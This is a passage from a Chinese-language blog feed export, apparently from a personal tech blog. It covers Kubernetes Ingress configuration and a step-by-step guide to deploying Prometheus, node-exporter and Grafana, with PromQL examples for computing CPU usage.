创建虚拟的 IP 地址（VIP），然后将流量根据负载均衡算法转发到后端的 Pod。</li><li>ipvs支持多种负载均衡算法，如轮询（Round Robin）、最少连接（Least Connection）、加权轮询（Weighted Round Robin）等。</li></ul></blockquote><table><thead><tr><th>模式</th><th>工作原理</th><th>优点</th><th>缺点</th><th>使用场景</th></tr></thead><tbody><tr><td>iptables</td><td>使用 Linux 内核的 <code>iptables</code> 规则来进行流量路由和负载均衡。</td><td>性能优越，简化配置。</td><td>随着规则数增多，性能会下降。负载均衡算法简单，通常是轮询。</td><td>中小规模的集群，适合大多数生产环境。</td></tr><tr><td>ipvs</td><td>使用 Linux 内核的 <code>ipvs</code> 模块来进行高效的负载均衡，支持多种负载均衡算法。</td><td>高效负载均衡，支持更多的调度算法，性能优秀。</td><td>配置复杂，需要内核支持 <code>ipvs</code> 模块。</td><td>大规模集群，高流量环境，复杂负载均衡需求</td></tr></tbody></table><h1 id="五、Ingress"><a href="#五、Ingress" class="headerlink" title="五、Ingress"></a>五、Ingress</h1><p>之前学习的svc资源，如果遇到多个服务要监听80端口时很明显无论哪种类型都无法实现，如果非要实现，就得在K8S集群外部部署一个LB设备，来代理到对应svc资源。而ingress就可以很好的解决这个问题。</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/5b1151206cd2452c824e6c99189bd104.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h2 id="什么是ingress呢？"><a href="#什么是ingress呢？" class="headerlink" title="什么是ingress呢？"></a><strong>什么是ingress呢？</strong></h2><blockquote><ul><li>所谓的ingress指的是一种规则，基于用户访问的请求头路由到正确的svc。说白了就是7层代理</li><li>可惜K8S只是实现了ingress定义规则，这个规则被记录到etcd中，但并没有具体实现此功能，因此需要自行安装相应的附加组件(ingress-nginx,trafik,…)</li></ul></blockquote><h2 id="svc和ingress的区别？"><a href="#svc和ingress的区别？" class="headerlink" title="svc和ingress的区别？"></a><strong>svc和ingress的区别？</strong></h2><blockquote><ul><li>ingress和svc的区别是，svc只能实现4层的代理。而ingress实现了7层的代理。</li></ul></blockquote><h2 id="Ingress-Controller和ingress区别？"><a href="#Ingress-Controller和ingress区别？" class="headerlink" title="Ingress Controller和ingress区别？"></a><strong>Ingress Controller和ingress区别？</strong></h2><blockquote><ul><li>ingress是定义域名到svc的解析规则，好比nginx.conf配置文件。</li><li>而ingress-controller适用于执行规则的程序，好比nginx程序。</li></ul></blockquote><h2 id="Ingress-Controller和内置的Pod控制器有啥区别呢？"><a href="#Ingress-Controller和内置的Pod控制器有啥区别呢？" class="headerlink" title="Ingress Controller和内置的Pod控制器有啥区别呢？"></a><strong>Ingress Controller和内置的Pod控制器有啥区别呢？</strong></h2><blockquote><ul><li>内置的Pod控制器，比如ds,sts,deploy,jobs,cj,rs,rc等都是用来控制Pod的副本数量。</li><li>而Ingress Controller是用来解析ingress规则的，两者并没有任何关系</li></ul></blockquote><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a><strong>demo</strong></h2><p>创建工作负载</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs yaml">[<span class="hljs-string">root@master231</span> <span class="hljs-string">~</span>]<span class="hljs-comment"># cat deploy-apps.yaml</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Deployment</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">deployment-apps-v1</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">3</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span><br>      <span class="hljs-attr">apps:</span> <span class="hljs-string">v1</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">apps:</span> <span class="hljs-string">v1</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">containers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">c1</span><br>        <span class="hljs-attr">image:</span> <span class="hljs-string">nginx:1.26.2</span><br>        <span class="hljs-attr">ports:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">containerPort:</span> <span class="hljs-number">80</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">svc-apps</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">apps:</span> <span class="hljs-string">v1</span><br>  <span class="hljs-attr">ports:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">protocol:</span> <span class="hljs-string">TCP</span><br>      <span class="hljs-attr">port:</span> <span class="hljs-number">80</span><br>      <span class="hljs-attr">targetPort:</span> <span class="hljs-number">80</span><span class="hljs-type">![</span><span class="hljs-string">点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)</span><br></code></pre></td></tr></table></figure><p>创建ingress资源</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nix">[root@master231 ~]<span class="hljs-comment"># cat 01-apps-ingress.yaml </span><br><span class="hljs-params">apiVersion:</span> networking.k8s.io<span class="hljs-symbol">/v1</span><br><span class="hljs-params">kind:</span> Ingress<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> apps-ingress<br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">rules:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">host:</span> apps.cherry.com<br>    <span class="hljs-params">http:</span><br>      <span class="hljs-params">paths:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">backend:</span><br>          <span class="hljs-params">service:</span><br>            <span class="hljs-params">name:</span> svc-apps<br>            <span class="hljs-params">port:</span><br>              <span class="hljs-params">number:</span> <span class="hljs-number">80</span><br>        <span class="hljs-params">path:</span> <span class="hljs-symbol">/</span><br>        <span class="hljs-params">pathType:</span> ImplementationSpecific<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>]]></content>
    
    
    <categories>
      
      <category>网络篇</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络篇</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>prometheus+Grafana+k8s全方位教学</title>
    <link href="/2025/04/15/prometheus-Grafana-k8s%E5%85%A8%E6%96%B9%E4%BD%8D%E6%95%99%E5%AD%A6/"/>
    <url>/2025/04/15/prometheus-Grafana-k8s%E5%85%A8%E6%96%B9%E4%BD%8D%E6%95%99%E5%AD%A6/</url>
    
    <content type="html"><![CDATA[<h2 id="1、架构图"><a href="#1、架构图" class="headerlink" title="1、架构图"></a>1、架构图</h2><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/39b97ead427144628582592e0c502bcd.png" alt="在这里插入图片描述"></p><h2 id="2、组件"><a href="#2、组件" class="headerlink" title="2、组件"></a>2、组件</h2><p><strong>Prometheus Server</strong><br>用于收集和存储时间序列数据。Prometheus Server 是 Prometheus 组件中的核心部分，负责实现对监控数据的获取，存储以及查询。 Prometheus Server 可以通过静态配置管理监控目标，也可以配合使用 Service Discovery 的方式动态管理监控目标，并从这些监控目标中获取数据。其次 Prometheus Server 需要对采集到的监控数据进行存储，Prometheus Server 本身就是一个时序数据库，将采集到的监控数据按照时间序列的方式存储在本地磁盘当中。最后Prometheus Server 对外提供了自定义的 PromQL 语言，实现对数据的查询以及分析。</p><p><strong>Exporter</strong><br>用于暴露已有的第三方服务的 metrics 给 Prometheus。Exporter 将监控数据采集的端点通过 HTTP 服务的形式暴露给 Prometheus Server，Prometheus Server 通过访问该 Exporter 提供的 Endpoint 端点，即可获取到需要采集的监控数据。</p><p><strong>Push Gateway</strong><br>主要用于短期的 jobs。由于这类 jobs 存在时间较短，可能在 Prometheus 来 pull 之前就消失了。为此，这些 jobs 可以直接向 Prometheus server 端推送它们的 metrics。</p><p><strong>Grafana</strong><br>第三方展示工具，可以编写 PromQL 查询语句，通过 http 协议与 prometheus 集成。</p><p><strong>AlertManager</strong><br>从 Prometheus Server 端接收到 alerts 后，会进行去除重复数据，分组，并路由到对方的接受方式，发出报警。常见的接收方式有：电子邮件，钉钉、企业微信，pagerduty等。</p><p><strong>Client Library</strong><br>客户端库，为需要监控的服务生成相应的 metrics 并暴露给 Prometheus Server。当 Prometheus Server 来 pull 时，直接返回实时状态的 metrics。</p><pre><code class="hljs">  监控流程：      1.exporter节点暴露监控指标;      2.Prometheus server修改配置文件监控暴露节点;      3.重载配置检查WebUI;      4.grafana出图展示;</code></pre><h2 id="3、prometheus部署"><a href="#3、prometheus部署" class="headerlink" title="3、prometheus部署"></a>3、prometheus部署</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">下载Prometheus的软件包<br>[root@prometheus-server31 ~]# wget https://github.com/prometheus/prometheus/releases/download/v2.53.2/prometheus-2.53.2.linux-amd64.tar.gz<br><br>上传普罗米修斯部署脚本（需要脚本可后台留言~）<br>[root@prometheus-server31 ~]# tar xf install-prometheus-server.tar.gz <br><br>安装<br>[root@prometheus-server31 ~]# ./install-prometheus-server.sh i<br></code></pre></td></tr></table></figure><h2 id="4、node-exporter环境搭建"><a href="#4、node-exporter环境搭建" class="headerlink" title="4、node-exporter环境搭建"></a>4、node-exporter环境搭建</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">下载软件包 <br>[root@prometheus-node41 ~]# wget https://github.com/prometheus/node_exporter/releases/download/v1.8.2/node_exporter-1.8.2.linux-amd64.tar.gz<br><br>脚本一键部署node-exporter（需要脚本后台留言~）<br>[root@prometheus-node41 ~]# tar xf install-node-exporter.tar.gz <br><br>安装服务 <br>[root@prometheus-node41 ~]# ./install-node-exporter.sh i<br></code></pre></td></tr></table></figure><h2 id="5、Prometheus-server监控node-exporter实战"><a href="#5、Prometheus-server监控node-exporter实战" class="headerlink" title="5、Prometheus server监控node-exporter实战"></a>5、Prometheus server监控node-exporter实战</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.修改Prometheus server的配置文件监控node-exporter节点 <br>[root@prometheus-server31 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br>...<br><span class="hljs-comment"># 修改通用全局配置</span><br>global:<br>  <span class="hljs-comment"># Prometheus server抓取数据的间隔时间，默认值为1分钟</span><br>  scrape_interval: 3s <br>  <br>...<br><span class="hljs-comment"># 定义抓取配置</span><br>scrape_configs:<br>  ...(添加如下信息)<br><br>    <span class="hljs-comment"># 自定义任务的名称</span><br>  - job_name: node-exporters<br>    <span class="hljs-comment"># 指定采集指标时访问的路径</span><br>    metrics_path: /metrics<br>    <span class="hljs-comment"># 指定采集指标时使用的协议</span><br>    scheme: http<br>    <span class="hljs-comment"># 指定被监控的node-exporter节点列表</span><br>    static_configs:<br>    - targets:<br>      - 10.0.0.41:9100<br>      - 10.0.0.42:9100<br>      - 10.0.0.43:9100<br><br><br>2.检查配置文件语法是否正确 <br>[root@prometheus-server31 ~]# /softwares/prometheus-2.53.2.linux-amd64/promtool check config  /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br><br>3.Prometheus server加载配置文件<br>[root@prometheus-server31 ~]# curl -X POST 10.0.0.31:9090/-/reload<br><br>4.给检查和加载配置文件起别名<br>[root@prometheus-server31 ~]# vim ~/.bashrc <br>...<br><span class="hljs-built_in">alias</span> rr=<span class="hljs-string">&#x27;curl -X POST 10.0.0.31:9090/-/reload&#x27;</span><br><span class="hljs-built_in">alias</span> check=<span class="hljs-string">&#x27;/softwares/prometheus-2.53.2.linux-amd64/promtool check config  /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml&#x27;</span><br><br>[root@prometheus-server31 ~]# <span class="hljs-built_in">source</span>  ~/.bashrc <br><br>5.查看Prometheus的WebUI验证节点是否加入成功<br>http://10.0.0.31:9090/targets<br><br>6..查看Prometheus的指标数据<br>node_cpu_seconds_total<br></code></pre></td></tr></table></figure><h2 id="6、PQL"><a href="#6、PQL" class="headerlink" title="6、PQL"></a>6、PQL</h2><p>prometheus监控中采集过来的数据统一称为Metrics数据，其并不是代表具体的数据格式，而是一种统计度量计算单位。</p><p>当我们需要为某个系统或者某个服务做监控时，就需要使用到metrics。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">前提条件: (所有节点时区同步)<br><span class="hljs-built_in">ln</span> -svf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime <br></code></pre></td></tr></table></figure><h4 id="体验promql"><a href="#体验promql" class="headerlink" title="体验promql"></a><strong>体验promql</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">1 查看某个特定的key<br>node_cpu_seconds_total<br><br>2 查看某个节点的指标<br>node_cpu_seconds_total&#123;instance=<span class="hljs-string">&quot;10.0.0.41:9100&quot;</span>&#125;<br><br>3 查看某个节点的某刻CPU的某种状态<br>node_cpu_seconds_total&#123;instance=<span class="hljs-string">&quot;10.0.0.41:9100&quot;</span>,cpu=<span class="hljs-string">&quot;0&quot;</span>,mode=<span class="hljs-string">&quot;idle&quot;</span>&#125;<br><br>4 查询最近10s内某个节点CPU的某种状态时间<br>node_cpu_seconds_total&#123;instance=<span class="hljs-string">&quot;10.0.0.41:9100&quot;</span>,cpu=<span class="hljs-string">&quot;0&quot;</span>,mode=<span class="hljs-string">&quot;idle&quot;</span>&#125;[10s]<br><br>5 统计1分钟内，使用标签过滤器查看<span class="hljs-string">&quot;10.0.0.42:9100&quot;</span>节点的第0颗CPU，非空闲状态使用的总时间<br>node_cpu_seconds_total&#123;mode!=<span class="hljs-string">&quot;idle&quot;</span>,cpu=<span class="hljs-string">&quot;0&quot;</span>, instance=<span class="hljs-string">&quot;10.0.0.42:9100&quot;</span>&#125;[1m]<br><br>6 统计1分钟内，使用标签过滤器查看<span class="hljs-string">&quot;10.0.0.42:9100&quot;</span>节点的第0颗CPU，mode名称以字母<span class="hljs-string">&quot;i&quot;</span>开头的所有CPU核心。<br>node_cpu_seconds_total&#123;mode=~<span class="hljs-string">&quot;i.*&quot;</span>,cpu=<span class="hljs-string">&quot;0&quot;</span>, instance=<span class="hljs-string">&quot;10.0.0.42:9100&quot;</span>&#125;[1m]<br><br>7 统计1分钟内，使用标签过滤器查看<span class="hljs-string">&quot;10.0.0.42:9100&quot;</span>节点的第0颗CPU，mode名称不是以字母<span class="hljs-string">&quot;i&quot;</span>开头的所有CPU核心。<br>node_cpu_seconds_total&#123;mode!~<span class="hljs-string">&quot;i.*&quot;</span>,cpu=<span class="hljs-string">&quot;0&quot;</span>, instance=<span class="hljs-string">&quot;10.0.0.42:9100&quot;</span>&#125;[1m]<br><br></code></pre></td></tr></table></figure><h4 id="Prometheus常用的函数"><a href="#Prometheus常用的函数" class="headerlink" title="Prometheus常用的函数"></a><strong>Prometheus常用的函数</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs bash">1 increase函数: 用来针对counter数据类型，截取其中一段时间总的增量。<br>举个例子:<br>   increase(node_cpu_seconds_total&#123;mode=<span class="hljs-string">&quot;idle&quot;</span>,cpu=<span class="hljs-string">&quot;0&quot;</span>, instance=<span class="hljs-string">&quot;10.0.0.42:9100&quot;</span>&#125;[1m])<br>统计1分钟内，使用标签过滤器查看<span class="hljs-string">&quot;10.0.0.42:9100&quot;</span>节点的第0颗CPU，空闲状态使用的总时间增量。<br><br>2 <span class="hljs-built_in">sum</span>函数: 加和的作用。<br>举个例子:<br> <span class="hljs-built_in">sum</span>(increase(node_cpu_seconds_total&#123;mode=<span class="hljs-string">&quot;idle&quot;</span>,cpu=<span class="hljs-string">&quot;0&quot;</span>&#125;[1m]))<br>统计1分钟内，使用标签过滤器查看所有节点的第0颗CPU，空闲状态使用的总时间增量，并将返回结果累加。<br><br>3 by函数: 将数据进行分组，类似于MySQL的<span class="hljs-string">&quot;GROUP BY&quot;</span>。<br>举个例子:<br><span class="hljs-built_in">sum</span>(increase(node_cpu_seconds_total&#123;mode=<span class="hljs-string">&quot;idle&quot;</span>&#125;[1m])) by (instance)<br>统计1分钟内，使用标签过滤器查看CPU空闲状态，并将结果进行累加，基于instance进行分组。<br><br>4 rate函数: 它的功能是按照设置的时间段，取counter在这个时间段中平均每秒的增量。<br>举个例子:<br>rate(node_cpu_seconds_total&#123;mode=<span class="hljs-string">&quot;idle&quot;</span>,cpu=<span class="hljs-string">&quot;0&quot;</span>, instance=<span class="hljs-string">&quot;10.0.0.42:9100&quot;</span>&#125;[1m])<br>统计1分钟内，使用标签过滤器查看<span class="hljs-string">&quot;10.0.0.42:9100&quot;</span>节点的第0颗CPU，空闲状态使用的每秒的增量。<br><br>increase和rate如何选择:<br>(1)对于采集数据频率较低的场景建议使用increase函数，因为使用rate函数可能会出现断点,比如针对硬盘容量监控。<br>(2)对于采集数据频率较高的场景建议使用rate函数，比如针对CPU，内存，网络流量等都是可以基于rate函数来采集等。<br><br>5 topk函数: 取前几位的最高值，实际使用的时候一般会用该函数进行瞬时报警，而不是为了观察曲线图。<br>举个例子:<br>topk(3, rate(node_cpu_seconds_total&#123;mode=<span class="hljs-string">&quot;idle&quot;</span>&#125;[1m]))<br>统计1分钟内，使用标签过滤器查看CPU，所有状态使用的每秒的增量，只查看前3个节点。<br><br>6 count函数:<br>把数值符合条件的，输出数目进行累加加和。<br>比如说企业中有100台服务器，如果只有10台服务器CPU使用率高于80%时候是不需要报警的，但是数量操作70台时就需要报警了。<br><br>举个例子:<br>count(tcp_wait_conn &gt; 500):<br>假设(tcp_wait_conn是咱们自定义的KEY。<br>若TCP等待数量大于500的机器数量就判断条件为真。<br><br>count(rate(node_cpu_seconds_total&#123;cpu=<span class="hljs-string">&quot;0&quot;</span>,mode=<span class="hljs-string">&quot;idle&quot;</span>&#125;[1m]))<br>对统计的结果进行计数。<br><br>7 其他函数  https://prometheus.io/docs/prometheus/latest/querying/functions/<br></code></pre></td></tr></table></figure><h4 id="监控CPU的使用情况案例"><a href="#监控CPU的使用情况案例" class="headerlink" title="监控CPU的使用情况案例"></a>监控CPU的使用情况案例</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash">1 统计各个节点CPU的使用率<br>1.1 我们需要先找到CPU相关的KEY<br>node_cpu_seconds_total<br><br>1.2 过滤出CPU的空闲时间(&#123;mode=<span class="hljs-string">&#x27;idle&#x27;</span>&#125;)和全部CPU的时间(<span class="hljs-string">&#x27;&#123;&#125;&#x27;</span>)<br>node_cpu_seconds_total&#123;mode=<span class="hljs-string">&#x27;idle&#x27;</span>&#125;<br>过滤CPU的空闲时间。<br><br>node_cpu_seconds_total&#123;&#125;<br>此处的<span class="hljs-string">&#x27;&#123;&#125;&#x27;</span>可以不写，因为里面没有任何参数，代表获取CPU的所有状态时间。<br><br>1.3 统计1分钟内CPU的增量时间<br>increase(node_cpu_seconds_total&#123;mode=<span class="hljs-string">&#x27;idle&#x27;</span>&#125;[1m])<br>统计1分钟内CPU空闲状态的增量。<br><br>increase(node_cpu_seconds_total[1m])<br>统计1分钟内CPU所有状态的增量。<br><br>1.4 将结果进行加和统计<br><span class="hljs-built_in">sum</span>(increase(node_cpu_seconds_total&#123;mode=<span class="hljs-string">&#x27;idle&#x27;</span>&#125;[1m]))<br>将1分钟内所有CPU空闲时间的增量进行加和计算。<br><br><span class="hljs-built_in">sum</span>(increase(node_cpu_seconds_total[1m]))<br>将1分钟内所有CPU空闲时间的增量进行加和计算。<br><br>1.5 按照不同节点进行分组<br><span class="hljs-built_in">sum</span>(increase(node_cpu_seconds_total&#123;mode=<span class="hljs-string">&#x27;idle&#x27;</span>&#125;[1m])) by (instance)<br>将1分钟内所有CPU空闲时间的增量进行加和计算，并按照机器实例进行分组。<br><br><span class="hljs-built_in">sum</span>(increase(node_cpu_seconds_total[1m])) by (instance)<br>将1分钟内所有CPU空闲时间的增量进行加和计算，并按照机器实例进行分组。<br><br>1.6 计算1分钟内CPU空闲时间的百分比<br><span class="hljs-built_in">sum</span>(increase(node_cpu_seconds_total&#123;mode=<span class="hljs-string">&#x27;idle&#x27;</span>&#125;[1m])) by (instance) / <span class="hljs-built_in">sum</span>(increase(node_cpu_seconds_total[1m])) by (instance)<br><br>1.7 统计1分钟内CPU的使用率，计算公式: (1 - CPU空闲时间的百分比) * 100%。<br>(1 - <span class="hljs-built_in">sum</span>(increase(node_cpu_seconds_total&#123;mode=<span class="hljs-string">&#x27;idle&#x27;</span>&#125;[1m])) by (instance) / <span class="hljs-built_in">sum</span>(increase(node_cpu_seconds_total[1m])) by (instance)) * 100<br><br>1.7 统计1小时内CPU的使用率，计算公式: (1 - CPU空闲时间的百分比) * 100%。<br>(1 - <span class="hljs-built_in">sum</span>(increase(node_cpu_seconds_total&#123;mode=<span class="hljs-string">&#x27;idle&#x27;</span>&#125;[1h])) by (instance) / <span class="hljs-built_in">sum</span>(increase(node_cpu_seconds_total[1h])) by (instance)) * 100<br><br><br>2 计算CPU用户态的1分钟内百分比<br><span class="hljs-built_in">sum</span>(increase(node_cpu_seconds_total&#123;mode=<span class="hljs-string">&#x27;user&#x27;</span>&#125;[1m])) by (instance) / <span class="hljs-built_in">sum</span>(increase(node_cpu_seconds_total[1m])) by (instance) * 100<br><br>3 计算CPU内核态的1分钟内百分比<br>(<span class="hljs-built_in">sum</span>(increase(node_cpu_seconds_total&#123;mode=<span class="hljs-string">&#x27;system&#x27;</span>&#125;[1m])) by (instance) / <span class="hljs-built_in">sum</span>(increase(node_cpu_seconds_total[1m])) by (instance)) * 100<br><br>4 计算CPU IO等待时间的1分钟内百分比<br>(<span class="hljs-built_in">sum</span>(increase(node_cpu_seconds_total&#123;mode=<span class="hljs-string">&#x27;iowait&#x27;</span>&#125;[1m])) by (instance) / <span class="hljs-built_in">sum</span>(increase(node_cpu_seconds_total[1m])) by (instance)) * 100<br></code></pre></td></tr></table></figure><h2 id="7、grafana"><a href="#7、grafana" class="headerlink" title="7、grafana"></a>7、grafana</h2><h4 id="grafana部署"><a href="#grafana部署" class="headerlink" title="grafana部署"></a>grafana部署</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">1. 下载grafana<br>wget https://dl.grafana.com/enterprise/release/grafana-enterprise_11.1.4_amd64.deb<br><br>2.安装grafana<br>[root@prometheus-server31 ~]# apt-get install -y adduser libfontconfig1 musl<br>[root@prometheus-server31 ~]# <br>[root@prometheus-server31 ~]# dpkg -i grafana-enterprise_11.1.4_amd64.deb<br><br>3.启动grafana <br>[root@prometheus-server31 ~]# systemctl <span class="hljs-built_in">enable</span> --now grafana-server<br>[root@prometheus-server31 ~]# <br>[root@prometheus-server31 ~]# ss -ntl | grep 3000<br>LISTEN 0      4096               *:3000            *:*    <br><br>4.访问grafana的WebUI<br>http://10.0.0.31:3000/login<br>- 1.初始化的用户名和密码均为: admin <br></code></pre></td></tr></table></figure><p><strong>配置Prometheus的数据源</strong></p><p><img src="https://i-blog.csdnimg.cn/direct/781412229a9249699bcf56555933b72f.png" alt="在这里插入图片描述"></p><p><img src="https://i-blog.csdnimg.cn/direct/89dcebbc6a794cdd9ce03c819b5ff35c.png" alt="在这里插入图片描述"></p><p><img src="https://i-blog.csdnimg.cn/direct/45133fff7e4146bf9b3b4a7e6b975270.png" alt="在这里插入图片描述"></p><p><strong>添加服务端地址</strong><br><img src="https://i-blog.csdnimg.cn/direct/69aff8fdd139453da62a7f029ce5fdb1.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/direct/96440f22bc744cf98ef6b9a796e7e8e6.png" 